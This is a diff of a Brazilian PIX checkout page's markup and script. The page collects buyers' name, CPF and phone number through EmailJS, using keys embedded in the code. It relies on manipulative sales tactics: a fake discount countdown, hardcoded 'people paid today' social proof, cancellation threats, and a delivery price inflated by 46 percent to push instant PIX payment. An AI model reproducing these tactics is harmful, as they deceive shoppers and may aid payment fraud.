+        .trust-seal i { font-size: 18px; color: #94a3b8; }
+        .trust-seal span { font-size: 8px; font-weight: 700; color: #94a3b8; text-transform: uppercase; }
+
+        .guarantee-box {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            border-radius: 12px;
+            padding: 14px;
+            margin: 0 16px 20px;
+            display: flex;
+            gap: 12px;
+        }
+        .guarantee-icon {
+            width: 32px;
+            height: 32px;
+            background: #e0f2fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0369a1;
+            flex-shrink: 0;
+        }
+        .guarantee-content h4 { font-size: 12px; font-weight: 700; color: #0369a1; margin-bottom: 2px; }
+        .guarantee-content p { font-size: 11px; color: #0c4a6e; line-height: 1.4; }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* MODALS */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
             display: none;
-            position: fixed; inset: 0;
-            background: rgba(0,0,0,0.7);
-            z-index: 999;
-            align-items: center; justify-content: center;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
         }
-        .expired-overlay.active { display: flex; }
-        .expired-card {
-            background: white; border-radius: 20px; padding: 32px 24px;
-            text-align: center; max-width: 340px; width: 100%;
+
+        .modal-overlay.active {
+            display: flex;
         }
-        .expired-icon { font-size: 3rem; margin-bottom: 12px; }
-        .expired-title { font-size: 1.3rem; font-weight: 800; color: var(--text-dark); margin-bottom: 8px; }
-        .expired-text { font-size: 0.9rem; color: var(--text-gray); margin-bottom: 20px; line-height: 1.5; }
-        .expired-btn { background: var(--primary); color: white; border: none; padding: 14px 24px; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; width: 100%; }
 
-        /* ===== MODALS ===== */
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); z-index: 1000; display: none; align-items: center; justify-content: center; padding: 20px; }
-        .modal-overlay.active { display: flex; }
-        .modal-content { background: white; width: 100%; max-width: 400px; border-radius: 24px; padding: 30px; position: relative; box-shadow: 0 8px 32px rgba(0,0,0,0.12); animation: modalIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes modalIn { from{opacity:0;transform:scale(0.9)} to{opacity:1;transform:scale(1)} }
-        .modal-close-btn { position: absolute; top: 15px; right: 15px; background: #f1f5f9; border: none; width: 32px; height: 32px; border-radius: 50%; cursor: pointer; color: var(--text-gray); display: flex; align-items: center; justify-content: center; }
-        .modal-icon { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; margin: 0 auto 20px; }
-        .modal-icon.warning { background: #fff7ed; color: #f97316; }
-        .modal-icon.success { background: #f0fdf4; color: #22c55e; }
-        .modal-title { font-size: 1.3rem; font-weight: 800; text-align: center; margin-bottom: 12px; }
-        .modal-text { text-align: center; color: var(--text-gray); font-size: 0.95rem; line-height: 1.5; margin-bottom: 25px; }
-        .modal-buttons { display: flex; flex-direction: column; gap: 12px; }
-        .btn-modal { width: 100%; padding: 14px; border-radius: 12px; font-size: 0.95rem; font-weight: 700; cursor: pointer; transition: all 0.2s; border: none; }
-        .btn-modal-pix { background: var(--primary); color: white; }
-        .btn-modal-continue { background: var(--primary); color: white; }
-        .contact-form { display: flex; flex-direction: column; gap: 15px; }
-        .form-group { display: flex; flex-direction: column; gap: 6px; position: relative; }
-        .form-group label { font-size: 0.8rem; font-weight: 700; color: var(--text-dark); }
-        .form-group input { padding: 12px; border: 2px solid var(--border-color); border-radius: 10px; outline: none; font-size: 1rem; }
-        .form-group input:focus { border-color: var(--primary); }
-        .form-group .input-check-icon { bottom: 12px; }
-        .btn-send-form { background: var(--primary); color: white; margin-top: 10px; }
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            padding: 30px;
+            position: relative;
+            box-shadow: var(--shadow-lg);
+            animation: modalIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
 
-        @keyframes spin { to{transform:rotate(360deg)} }
-        @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:translateY(0)} }
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .modal-close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #f1f5f9;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            color: var(--text-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            margin: 0 auto 20px;
+        }
+
+        .modal-icon.warning {
+            background: #fff7ed;
+            color: #f97316;
+        }
+
+        .modal-icon.success {
+            background: #f0fdf4;
+            color: #22c55e;
+        }
+
+        .modal-title {
+            font-size: 1.3rem;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .modal-text {
+            text-align: center;
+            color: var(--text-gray);
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn-modal {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+        }
+
+        .btn-modal-pix {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-modal-continue {
+            background: var(--primary);
+            color: white;
+        }
+
+        .contact-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            position: relative;
+        }
+
+        .form-group label {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        .form-group input {
+            padding: 12px;
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary);
+        }
+
+        .input-check-icon {
+            position: absolute;
+            right: 14px;
+            bottom: 12px;
+            color: var(--success);
+            font-size: 1rem;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .input-check-icon.visible {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .pix-input-group .input-check-icon {
+            bottom: 14px;
+        }
+
+        .btn-send-form {
+            background: var(--primary);
+            color: white;
+            margin-top: 10px;
+        }
+
+        .delivery-warning-container {
+            display: none;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .payment-option-card.selected .delivery-warning-container {
+            display: flex;
+        }
+
+        .delivery-warning-box {
+            background: #fff7ed;
+            border: 1px solid #ffedd5;
+            padding: 12px;
+            border-radius: 12px;
+            display: flex;
+            gap: 10px;
+            color: #9a3412;
+            font-size: 0.8rem;
+            line-height: 1.4;
+        }
+
+        .delivery-warning-box i {
+            font-size: 1rem;
+            margin-top: 2px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .pix-error-msg {
+            background: #fef2f2;
+            border: 1px solid rgba(255, 59, 48, 0.2);
+            border-radius: 10px;
+            padding: 10px 14px;
+            font-size: 0.85rem;
+            color: var(--danger);
+            font-weight: 600;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .pix-error-msg.visible {
+            display: flex;
+        }
+
+        /* Estilo Harmônico e Minimalista da Etiqueta Promoção */
+.payment-option-title {
+    display: flex;
+    align-items: center;
+    gap: 10px; /* Espaçamento equilibrado */
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    font-weight: 700;
+    color: #1a1a1a;
+}
+
+.promo-badge {
+    background-color: rgba(40, 167, 69, 0.08); 
+    color: #1e7e34; 
+    border: 1px solid rgba(40, 167, 69, 0.2);
+    padding: 2px 8px;
+    border-radius: 6px; 
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    text-transform: none; 
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    line-height: 1;
+    height: 20px;
+    white-space: nowrap;
+    transition: all 0.2s ease;
+}
+
+.payment-option-card:hover .promo-badge {
+    background-color: rgba(40, 167, 69, 0.12);
+    border-color: rgba(40, 167, 69, 0.3);
+}
+
     </style>
 </head>
 <body>
-    <!-- MAIN CONTAINER (payment options) -->
     <div class="container" id="mainContainer">
         <header class="header">
             <div class="header-left">
-                <button class="back-btn"><i class="fas fa-arrow-left"></i></button>
-                <div>
+                <button class="back-btn" title="Voltar">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                <div class="brand-section">
                     <div class="brand-logo">PAG-ONLINE</div>
                     <div class="brand-tagline">Pagamento Seguro</div>
                 </div>
             </div>
             <div class="header-right">
-                <button class="cart-btn">
+                <button class="search-btn" title="Buscar">
+                    <i class="fas fa-search"></i>
+                </button>
+                <button class="cart-btn" id="cart-btn" title="Carrinho">
                     <i class="fas fa-shopping-cart"></i>
-                    <span class="cart-badge">1</span>
+                    <span class="cart-badge" id="cart-badge">1</span>
                 </button>
             </div>
         </header>
+
         <div class="trust-banner">
-            <div class="trust-item"><i class="fas fa-lock"></i><span>100% Seguro</span></div>
-            <div class="trust-item"><i class="fas fa-check-circle"></i><span>Garantido</span></div>
+            <div class="trust-item">
+                <i class="fas fa-lock"></i>
+                <span>100% Seguro</span>
+            </div>
+            <div class="trust-item">
+                <i class="fas fa-check-circle"></i>
+                <span>Garantido</span>
+            </div>
         </div>
+
         <div id="cart-content-wrapper"></div>
     </div>
 
-    <!-- PIX SCREEN -->
+    <!-- TELA PIX (FULL PAGE) -->
     <div id="pixScreen">
         <header class="hdr">
-            <div class="hdr-space"></div>
-            <span class="hdr-title">Pagamento via Pix</span>
-            <div class="hdr-space"></div>
+          <div class="hdr-space"></div>
+          <span class="hdr-title">Pagamento via Pix</span>
+          <div class="hdr-space"></div>
         </header>
 
         <div class="progress-steps">
@@ -510,35 +943,29 @@
             </div>
         </div>
 
-        <!-- URGENCY TIMER — redesigned with price consequence -->
-        <div class="timer-container" id="timerContainer">
-            <div class="timer-headline">
-                <div class="timer-label"><i class="fas fa-fire"></i> Preço com desconto expira em</div>
-                <span class="pix-timer-badge" id="pixTimer">08:00</span>
-            </div>
-            <div class="timer-consequence" id="timerConsequence">
-                <i class="fas fa-tag"></i>
-                <span id="timerPriceText">Após o prazo o valor volta a R$ —</span>
+        <div class="timer-container">
+            <div class="timer-top">
+                <i class="fas fa-bolt"></i>
+                <span>Desconto reservado por</span>
+                <span class="pix-timer-badge" id="pixTimer">15:00</span>
             </div>
             <div class="timer-bar"><div class="timer-bar-fill" id="pixTimerBar"></div></div>
         </div>
 
-        <!-- SOCIAL PROOF -->
-        <div class="social-proof">
-            <div class="social-proof-dot"></div>
-            <span id="socialProofText">34 pessoas pagaram com PIX hoje</span>
+        <div class="pix-total-row">
+          <div>
+            <span>Total com PIX</span>
+            <div class="pix-savings-line" id="pixSavingsLine"></div>
+          </div>
+          <div class="pix-total-val-container">
+              <span class="pix-old-price" id="pixOldPrice"></span>
+              <span class="pix-total-val" id="pixTotal"></span>
+          </div>
         </div>
 
-        <!-- TOTAL -->
-        <div class="pix-total-row">
-            <div>
-                <span>Total com PIX</span>
-                <div class="pix-savings-line" id="pixSavingsLine"></div>
-            </div>
-            <div style="text-align:right;">
-                <span class="pix-old-price" id="pixOldPrice"></span>
-                <span class="pix-total-val" id="pixTotal"></span>
-            </div>
+        <div class="pix-qr-wrap">
+          <div id="pixQrCode" class="pix-qr-img-container"></div>
+          <div class="pix-qr-caption">Escaneie com o app do seu banco</div>
         </div>
 
         <!-- PRIMARY CTA -->
@@ -547,74 +974,20 @@
             <span>Copiar código PIX</span>
         </button>
 
-        <!-- COPY CONFIRMATION STRIP -->
-        <div class="copy-confirm-strip" id="copyConfirmStrip">
-            <i class="fas fa-check-circle"></i>
-            <span id="copyConfirmText"></span>
-        </div>
-
-        <!-- QR CODE -->
-        <div class="pix-qr-wrap">
-            <div id="pixQrCode" class="pix-qr-img-container"></div>
-            <div class="pix-qr-caption">Escaneie com o app do seu banco</div>
-        </div>
-
-        <!-- CODE FIELD -->
-        <div class="pix-code-field">
+        <div class="pix-code-field" id="pixCodeField">
             <input class="pix-copia-input" id="pixCopiaCola" readonly type="text">
             <button class="pix-btn-copiar" id="btnCopiarPix" onclick="copiarPix()">Copiar</button>
         </div>
 
-        <!-- BANK DEEP LINKS -->
-        <div class="bank-links-section">
-            <div class="bank-links-title"><i class="fas fa-bolt"></i> Abrir direto no seu banco</div>
-            <div class="bank-links-grid">
-                <a class="bank-btn bank-nubank" href="#" onclick="openBank('nubank'); return false;">
-                    <div class="bank-icon">Nu</div>
-                    <span>Nubank</span>
-                </a>
-                <a class="bank-btn bank-inter" href="#" onclick="openBank('inter'); return false;">
-                    <div class="bank-icon"><i class="fas fa-circle"></i></div>
-                    <span>Inter</span>
-                </a>
-                <a class="bank-btn bank-itau" href="#" onclick="openBank('itau'); return false;">
-                    <div class="bank-icon"><i class="fas fa-university"></i></div>
-                    <span>Itaú</span>
-                </a>
-                <a class="bank-btn bank-bb" href="#" onclick="openBank('bb'); return false;">
-                    <div class="bank-icon"><i class="fas fa-star"></i></div>
-                    <span>Banco do Brasil</span>
-                </a>
-                <a class="bank-btn bank-caixa" href="#" onclick="openBank('caixa'); return false;">
-                    <div class="bank-icon"><i class="fas fa-home"></i></div>
-                    <span>Caixa</span>
-                </a>
-                <a class="bank-btn bank-c6" href="#" onclick="openBank('c6'); return false;">
-                    <div class="bank-icon">C6</div>
-                    <span>C6 Bank</span>
-                </a>
-            </div>
-        </div>
-
-        <!-- AWAITING -->
         <div class="pix-aguardando">
-            <div class="pix-dot-loader"><span></span><span></span><span></span></div>
-            <span>Aguardando confirmação do banco...</span>
+          <div class="pix-dot-loader"><span></span><span></span><span></span></div>
+          <span>Aguardando confirmação do banco...</span>
         </div>
 
-        <!-- INSTRUCTIONS -->
         <div class="pix-info">
-            <div class="pix-info-step"><span class="step-num">1</span><span>Copie o código ou escaneie o QR acima</span></div>
-            <div class="pix-info-step"><span class="step-num">2</span><span>Abra seu banco em <b>PIX → Copia e Cola</b> e cole o código</span></div>
-            <div class="pix-info-step"><span class="step-num">3</span><span>Confirme e pronto — seu pedido é liberado automaticamente</span></div>
-        </div>
-
-        <!-- CANCELLATION WARNING -->
-        <div class="cancel-warning">
-            <i class="fas fa-exclamation-triangle cancel-warning-icon"></i>
-            <div class="cancel-warning-text">
-                <strong>Importante:</strong> Se o pagamento não for confirmado dentro do prazo, <strong>seu pedido será cancelado automaticamente</strong> e o estoque liberado para outros clientes.
-            </div>
+          <div class="pix-info-step"><span class="step-num">1</span><span>Copie o código acima</span></div>
+          <div class="pix-info-step"><span class="step-num">2</span><span>Abra o app do seu banco em <b>PIX Copia e Cola</b></span></div>
+          <div class="pix-info-step"><span class="step-num">3</span><span>Cole, confirme e pronto — liberação automática</span></div>
         </div>
 
         <div class="pix-secure-line">
@@ -622,29 +995,24 @@
         </div>
     </div>
 
-    <!-- EXPIRED OVERLAY -->
-    <div class="expired-overlay" id="expiredOverlay">
-        <div class="expired-card">
-            <div class="expired-icon">⏰</div>
-            <div class="expired-title">Tempo esgotado!</div>
-            <div class="expired-text">Seu código PIX expirou e o pedido foi cancelado. Mas não se preocupe — você pode gerar um novo agora e garantir o mesmo desconto.</div>
-            <button class="expired-btn" onclick="location.reload()">Gerar novo PIX com desconto</button>
-        </div>
-    </div>
-
-    <!-- DELIVERY MODAL -->
     <div class="modal-overlay" id="delivery-modal">
         <div class="modal-content">
-            <button class="modal-close-btn" id="modal-close-btn-delivery"><i class="fas fa-times"></i></button>
+            <button class="modal-close-btn" id="modal-close-btn-delivery">
+                <i class="fas fa-times"></i>
+            </button>
+
             <div id="modal-step-1">
                 <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
                 <h3 class="modal-title">Você tem certeza?</h3>
                 <p class="modal-text" id="delivery-warning-text"></p>
                 <div class="modal-buttons">
                     <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
-                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">Continuar sem desconto</button>
+                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">
+                        Continuar sem desconto
+                    </button>
                 </div>
             </div>
+
             <div id="modal-step-2" style="display:none;">
                 <h3 class="modal-title">Dados para Entrega</h3>
                 <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
@@ -668,6 +1036,7 @@
                     <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
                 </form>
             </div>
+
             <div id="modal-step-3" style="display:none;">
                 <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
                 <h3 class="modal-title">Pedido Recebido!</h3>
@@ -678,37 +1047,15 @@
     </div>
 
     <script>
-        const EMAILJS_SERVICE_ID = 'service_z9s6r88';
-        const EMAILJS_TEMPLATE_ID = 'template_ymp0ana';
-        const EMAILJS_PUBLIC_KEY = 'B7vWg-DOSfFey8sM3';
-
-        // Bank deep links (PIX Copia e Cola intent URLs)
-        const BANK_LINKS = {
-            nubank:  'nubank://pix',
-            inter:   'bancointer://pix',
-            itau:    'itauunibanco://pix',
-            bb:      'bradesco://pix',    // fallback — BB doesn't have universal scheme
-            caixa:   'caixa://pix',
-            c6:      'c6bank://pix'
-        };
-
-        function openBank(bank) {
-            copiarPix(); // ensure code is copied first
-            const scheme = BANK_LINKS[bank];
-            if (scheme) {
-                const start = Date.now();
-                setTimeout(() => {
-                    // If app didn't open (user still on page), show fallback tip
-                    if (Date.now() - start < 1500) {
-                        alert('Não foi possível abrir o app automaticamente. O código PIX já foi copiado — abra seu banco manualmente e cole em PIX → Copia e Cola.');
-                    }
-                }, 1200);
-                window.location.href = scheme;
-            }
-        }
+        // ==================== CONFIGURAÇÕES FIXAS ====================
+        const EMAILJS_SERVICE_ID = 'service_z9s6r88'; 
+        const EMAILJS_TEMPLATE_ID = 'template_ymp0ana'; 
+        const EMAILJS_PUBLIC_KEY = 'B7vWg-DOSfFey8sM3'; 
+        // =============================================================
 
         function getUrlParameter(name) {
-            return new URLSearchParams(window.location.search).get(name);
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name);
         }
 
         const subtotalFromUrl = getUrlParameter('subtotal');
@@ -718,100 +1065,160 @@
             emailjs.init(EMAILJS_PUBLIC_KEY);
         }
 
-        function maskCPF(v) {
-            return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})/,'$1-$2').replace(/(-\d{2})\d+?$/,'$1');
-        }
-        function maskPhone(v) {
-            return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/g,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').replace(/(-\d{4})\d+?$/,'$1');
+        function maskCPF(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
+                .replace(/(-\d{2})\d+?$/, '$1');
         }
 
-        function setupInput(el, validator, maskFn) {
-            const container = el.parentElement;
-            let icon = container.querySelector('.input-check-icon');
-            if (!icon) {
-                icon = document.createElement('i');
-                icon.className = 'fas fa-check-circle input-check-icon';
-                container.appendChild(icon);
+        function maskPhone(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/g, '($1) $2')
+                .replace(/(\d{5})(\d)/, '$1-$2')
+                .replace(/(-\d{4})\d+?$/, '$1');
+        }
+
+        function setupPhoneInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
             }
-            el.addEventListener('input', e => {
-                if (maskFn) e.target.value = maskFn(e.target.value);
-                icon.classList.toggle('visible', validator(e.target.value));
+
+            inputElement.addEventListener('input', (e) => {
+                e.target.value = maskPhone(e.target.value);
+                const rawValue = e.target.value.replace(/\D/g, '');
+                if (rawValue.length === 11) {
+                    checkIcon.classList.add('visible');
+                } else {
+                    checkIcon.classList.remove('visible');
+                }
             });
-            el.addEventListener('blur', e => {
-                icon.classList.toggle('visible', validator(e.target.value));
+        }
+
+        function setupCPFInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+
+            inputElement.addEventListener('input', (e) => {
+                e.target.value = maskCPF(e.target.value);
+                const rawValue = e.target.value.replace(/\D/g, '');
+                if (rawValue.length === 11) {
+                    checkIcon.classList.add('visible');
+                } else {
+                    checkIcon.classList.remove('visible');
+                }
+            });
+        }
+
+        function setupNameInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+
+            inputElement.addEventListener('blur', (e) => {
+                const value = e.target.value.trim();
+                const names = value.split(/\s+/);
+                if (names.length >= 2 && names[0].length >= 2 && names[1].length >= 2) {
+                    checkIcon.classList.add('visible');
+                } else {
+                    checkIcon.classList.remove('visible');
+                }
             });
         }
 
         function renderPaymentOptions() {
             const baseTotal = subtotalValue;
             const deliveryTotal = baseTotal * 1.46;
-            const oldPrice = baseTotal * 1.15;
-            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher pagamento na entrega você paga <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> sem desconto e perde a promoção via Pix de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
+            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Pix de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
+            let selectedPaymentType = '';
 
-            let selected = '';
-            document.getElementById('cart-content-wrapper').innerHTML = `
+            const paymentHTML = `
                 <div class="review-block">
                     <div class="review-header-bar">
-                        <button class="review-back-btn" id="payment-back-btn"><i class="fas fa-arrow-left"></i></button>
+                        <button class="review-back-btn" id="payment-back-btn">
+                            <i class="fas fa-arrow-left"></i>
+                        </button>
                         <div class="review-header-title"><i class="fas fa-credit-card"></i> Opções de Pagamento</div>
                     </div>
-                    <div>
+                    <div class="payment-options-container">
                         <div class="payment-option-card" id="pay-now-pix">
-                            <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
-                            <div class="payment-option-title">
-                                Pagar Agora - Pix
-                                <span class="promo-badge">Promoção</span>
-                            </div>
-                            <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
-                            <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
-                            <div class="pix-form-container" id="pix-form">
-                                <div class="pix-input-group">
-                                    <label>Nome e Sobrenome</label>
-                                    <input type="text" id="pix-name" placeholder="Ex: João Silva">
+                            <div id="pix-original-content">
+                                <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
+                                <div class="payment-option-title">
+                                    <span>Pagar Agora - Pix</span>
+                                    <span class="promo-badge">Promoção</span>
                                 </div>
-                                <div class="pix-input-group">
-                                    <label>CPF</label>
-                                    <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+                                <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
+                                <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
+                                <div class="pix-form-container" id="pix-form">
+                                    <div class="pix-input-group">
+                                        <label for="pix-name">Nome e Sobrenome</label>
+                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
+                                    </div>
+                                    <div class="pix-input-group">
+                                        <label for="pix-cpf">CPF</label>
+                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
+                                    </div>
+                                    <div class="pix-input-group">
+                                        <label for="pix-phone">Telefone</label>
+                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
+                                    </div>
+                                    <div class="pix-error-msg" id="pix-error-msg">
+                                        <i class="fas fa-exclamation-circle"></i>
+                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
+                                    </div>
+                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;">
+                                        <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
+                                    </button>
                                 </div>
-                                <div class="pix-input-group">
-                                    <label>Telefone</label>
-                                    <input type="tel" id="pix-phone" placeholder="(00) 00000-0000">
-                                </div>
-                                <div class="pix-error-msg" id="pix-error-msg">
-                                    <i class="fas fa-exclamation-circle"></i>
-                                    <span id="pix-error-text">Erro ao gerar código PIX.</span>
-                                </div>
-                                <button class="payment-action-btn" id="btn-generate-pix">
-                                    <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
-                                </button>
                             </div>
                         </div>
-
                         <div class="payment-option-card" id="pay-on-delivery">
-                            <div style="position:absolute;top:12px;right:-30px;background:var(--text-gray);color:white;padding:4px 35px;font-size:0.7rem;font-weight:800;transform:rotate(45deg)">Sem Desconto</div>
+                            <div class="payment-badge-delivery" style="position: absolute; top: 12px; right: -30px; background: var(--text-light); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
                             <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
                             <div class="payment-option-title">Pagar na Entrega</div>
                             <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
                             <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro.</div>
                             <div class="delivery-warning-container">
-                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div>Ao escolher pagamento na entrega você paga R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos.</div></div>
-                                <button class="payment-action-btn btn-pay-delivery">Prosseguir <i class="fas fa-chevron-right"></i></button>
+                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Pix de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
+                                <button class="payment-action-btn btn-pay-delivery" style="margin-top:10px; background: var(--primary);">Prosseguir <i class="fas fa-chevron-right"></i></button>
                             </div>
                         </div>
                     </div>
-                </div>`;
+                </div>
+            `;
 
-            setupInput(document.getElementById('pix-name'), v => v.trim().split(/\s+/).length >= 2 && v.trim().length >= 5, null);
-            setupInput(document.getElementById('pix-cpf'), v => v.replace(/\D/g,'').length === 11, maskCPF);
-            setupInput(document.getElementById('pix-phone'), v => v.replace(/\D/g,'').length === 11, maskPhone);
+            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
+            const pixNameInput = document.getElementById('pix-name');
+            if (pixNameInput) setupNameInput(pixNameInput);
+            const pixCpfInput = document.getElementById('pix-cpf');
+            if (pixCpfInput) setupCPFInput(pixCpfInput);
+            const pixPhoneInput = document.getElementById('pix-phone');
+            if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
 
             const pixCard = document.getElementById('pay-now-pix');
             const deliveryCard = document.getElementById('pay-on-delivery');
 
-            pixCard.addEventListener('click', e => {
+            pixCard.addEventListener('click', (e) => {
                 if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
-                if (selected !== 'pix') {
-                    selected = 'pix';
+                if (selectedPaymentType !== 'pix') {
+                    selectedPaymentType = 'pix';
                     pixCard.classList.add('selected');
                     deliveryCard.classList.remove('selected');
                 } else if (e.target.closest('#btn-generate-pix')) {
@@ -819,9 +1226,9 @@
                 }
             });
 
-            deliveryCard.addEventListener('click', e => {
-                if (selected !== 'delivery') {
-                    selected = 'delivery';
+            deliveryCard.addEventListener('click', (e) => {
+                if (selectedPaymentType !== 'delivery') {
+                    selectedPaymentType = 'delivery';
                     deliveryCard.classList.add('selected');
                     pixCard.classList.remove('selected');
                 } else if (e.target.closest('.btn-pay-delivery')) {
@@ -834,13 +1241,21 @@
             try {
                 const addressFromUrl = getUrlParameter('address') || '';
                 const cepFromUrl = getUrlParameter('cep') || '';
-                let endereco_entrega = addressFromUrl ? `Endereço: ${addressFromUrl}${cepFromUrl ? ', CEP: ' + cepFromUrl : ''}` : '';
-                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-                    endereco_entrega,
